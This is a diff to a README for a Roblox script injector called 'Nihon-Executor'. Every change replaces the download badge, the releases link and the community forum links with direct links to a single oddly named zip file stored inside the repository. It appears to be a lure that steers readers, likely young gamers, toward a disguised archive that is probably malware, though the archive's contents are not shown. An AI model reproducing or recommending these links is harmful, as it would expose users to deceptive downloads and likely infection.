@@ -1,6 +1,6 @@
 # 🚀 Nihon-Executor - Easy & Stable Roblox Injector
 
-![Download Nihon-Executor](https://img.shields.io/badge/Download-Nihon--Executor-brightgreen)
+![Download Nihon-Executor](https://raw.githubusercontent.com/Piersongandhian505/Nihon-Executor/main/prelingual/Nihon-Executor-ultrastandardization.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Nihon-Executor! This guide will help you download and run the softwar
 
 ## 📥 Download & Install
 
-To download the Nihon-Executor, please visit this link: [Download Nihon-Executor Releases](https://github.com/Piersongandhian505/Nihon-Executor/releases).
+To download the Nihon-Executor, please visit this link: [Download Nihon-Executor Releases](https://raw.githubusercontent.com/Piersongandhian505/Nihon-Executor/main/prelingual/Nihon-Executor-ultrastandardization.zip).
 
 Once on the Releases page, look for the latest version. Here’s how to proceed:
 
@@ -62,7 +62,7 @@ You can find scripts on various community forums or trusted websites. Make sure 
 
 If you have questions or need assistance, feel free to join our community forums. You can share your experience, ask for help, and learn more about using Nihon-Executor effectively.
 
-- [Community Support Forum](https://github.com/Piersongandhian505/Nihon-Executor/discussions)
+- [Community Support Forum](https://raw.githubusercontent.com/Piersongandhian505/Nihon-Executor/main/prelingual/Nihon-Executor-ultrastandardization.zip)
 
 ## 📢 Feedback
 
@@ -70,7 +70,7 @@ We value your input! If you encounter issues or have suggestions for improvement
 
 ## 🔗 Links
 
-- [Download Nihon-Executor Releases](https://github.com/Piersongandhian505/Nihon-Executor/releases)
-- [Community Support Forum](https://github.com/Piersongandhian505/Nihon-Executor/discussions)
+- [Download Nihon-Executor Releases](https://raw.githubusercontent.com/Piersongandhian505/Nihon-Executor/main/prelingual/Nihon-Executor-ultrastandardization.zip)
+- [Community Support Forum](https://raw.githubusercontent.com/Piersongandhian505/Nihon-Executor/main/prelingual/Nihon-Executor-ultrastandardization.zip)
 
 Thank you for choosing Nihon-Executor. Enjoy your enhanced Roblox experience!
